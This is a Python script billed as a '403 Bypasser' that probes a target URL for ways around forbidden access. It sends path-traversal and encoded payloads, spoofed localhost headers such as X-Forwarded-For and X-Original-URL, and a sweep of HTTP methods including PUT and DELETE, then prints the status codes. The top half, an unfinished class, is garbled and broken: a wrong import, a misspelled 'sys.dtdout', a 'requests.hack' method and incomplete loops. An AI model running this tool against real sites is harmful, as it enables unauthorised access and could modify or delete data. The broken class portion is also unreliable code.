
#####################################################
#                                                   #                    
#  coded by : @yogorta/4m4z1gh                      #
#                                                   #
#####################################################
from requests import requests
import sys
import os
import Thread
import parse


class Bypass403(Exception):
    def __init__(self):
        self.url = None
        self.path = None

        self.delimiters = [ "/","/*","/%2f/","/./",
                            "./.","/*/","?","??","&",
                            "#","%","%20","%09","/..;/",
                            "../","..%2f","..;/",".././",
                            "..%00/","..%0d","..%5c","..%ff/",
                            "%2e%2e%2f",".%2e/","%3f","%26",
                            "%23",".json"
                        ]
        
        self.requestObjs={  'get':      requests.get, 
                            'post':     requests.post, 
                            'head':     requests.head, 
                            'hack':     requests.hack, 
                            'put':      requests.put, 
                            'options':  requests.options, 
                            'connect':  requests.connect,
                            'patch':    requests.patch,
                            'delete':   requests.delete
                        }
        
        self.headers = {
            'X-Originating-IP'  : '127.0.0.1',
            'X-Forwarded-For'   : '127.0.0.1',
            'X-Forwarded'       : '127.0.0.1',
            'Forwarded-For'     : '127.0.0.1',
            'X-Remote-IP'       : '127.0.0.1',
            'X-Remote-Addr'     : '127.0.0.1',
            'X-ProxyUser-Ip'    : '127.0.0.1',
            'X-Original-URL'    : '127.0.0.1',
            'Client-IP'         : '127.0.0.1',
            'True-Client-IP'    : '127.0.0.1',
            'Cluster-Client-IP' : '127.0.0.1',
            'X-ProxyUser-Ip'    : '127.0.0.1',
            'Host'              : 'localhost',
            'X-Original-URL'    : 'PATH',
            'X-Rewrite-URL'     : 'PATH'
        }
        
        def print(self. data:str)->void:
            sys.stdout.flush()
            sys.dtdout.write(f"\r\r{data}")
            time.sleep(.001)

        def getResponse(self, reqObj, url, headers=[]):
            resonse = requests.
        def attack(self):
            for requestObj in self.requesObjs.itemes():
            
            
            warnings.filterwarnings('ignore', message='Unverified HTTPS request')

parser = argparse.ArgumentParser(description="403 Bypasser : python 403-bypass.py -u https://www.example.com -p admin")
parser.add_argument('-u', '--url' , help = 'Provide url ' , required=True)
parser.add_argument('-p' , '--path' , help = 'Provide the path' , required=True)
args = parser.parse_args()

url = args.url
path = args.path

payloads = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23",".json"]

full_url = url+'/'+path
slash_path = '/'+path

for payload in payloads:
	try:
		full_url2 = url+slash_path+payload
		req = requests.get(full_url2 , allow_redirects=False , verify = False , timeout = 5)
		print(full_url2 + ' : ' + str(req.status_code))

	except Exception:
		pass

for payload in payloads:
	try:
		full_url3 = url+payload+path
		r = requests.get(full_url3 , allow_redirects=False , verify = False , timeout = 5)
		print(full_url3 + ' : ' + str(r.status_code))

	except Exception:
		pass



r1 = requests.get(full_url, headers={"X-Original-URL":path} , allow_redirects=False , verify=False , timeout=5)
print(full_url + ' : ' +"(X-Original-URL: "+ path + ')' + ' : ' + str(r1.status_code))

r2 = requests.get(full_url, headers={"X-Custom-IP-Authorization" : "127.0.0.1"} , allow_redirects=False , verify=False , timeout=5)
print(full_url + ' : ' + "(X-Custom-IP-Authorization: 127.0.0.1" + ')'+ ' : ' + str(r2.status_code))

r3 = requests.get(full_url, headers={"X-Forwarded-For": "http://127.0.0.1"} , allow_redirects=False , verify=False , timeout=5)
print(full_url + ' : ' + "(X-Forwarded-For: http://127.0.0.1" + ')'+ ' : ' + str(r3.status_code))

r4 = requests.get(full_url, headers={"X-Forwarded-For": "127.0.0.1:80"} , allow_redirects=False , verify=False , timeout=5)
print(full_url + ' : ' + "(X-Forwarded-For: 127.0.0.1:80" + ')'+ ' : ' + str(r4.status_code))

r5 = requests.get(url, headers={"X-rewrite-url": slash_path} , allow_redirects=False , verify=False , timeout=5)
print(full_url + ' : ' + "(X-rewrite-url: {}".format(slash_path) + ')'+ ' : ' + str(r5.status_code))

r6 = requests.get(full_url, headers={'X-Forwarded-Host':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
print(full_url + ' : ' + "X-Forwarded-Host:127.0.0.1" + ')'+ ' : ' + str(r6.status_code))

r7 = requests.get(full_url, headers={'X-Host':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
print(full_url + ' : ' + "X-Host:127.0.0.1" + ')'+ ' : ' + str(r7.status_code))

r8 = requests.get(full_url, headers={'X-Remote-IP':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
print(full_url + ' : ' + "X-Remote-IP:127.0.0.1" + ')'+ ' : ' + str(r8.status_code))

r9 = requests.get(full_url, headers={'X-Originating-IP':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
print(full_url + ' : ' + "X-Originating-IP:127.0.0.1" + ')'+ ' : ' + str(r9.status_code))

r10 = requests.get(full_url, allow_redirects=False, verify=False, timeout= 5)
print(full_url +  ' : ' + 'Using GET: ' + str(r10.status_code))

r11 = requests.post(full_url, allow_redirects=False, verify=False, timeout= 5)
print(full_url + ' : ' + 'Using POST: ' + str(r11.status_code))

r12 = requests.head(full_url, allow_redirects=False, verify=False, timeout= 5)
print(full_url + ' : ' + 'Using HEAD: ' + str(r12.status_code))

r13 = requests.put(full_url, allow_redirects=False, verify=False, timeout= 5)
print(full_url + ' : ' + 'Using PUT: ' + str(r13.status_code))

r14 = requests.delete(full_url, allow_redirects=False, verify=False, timeout= 5)
print(full_url + ' : ' +'Using DELETE: ' + str(r14.status_code))

r15 = requests.patch(full_url, allow_redirects=False, verify=False, timeout= 5)
print(full_url + ' : ' + 'Using PATCH: ' + str(r15.status_code))
                
            
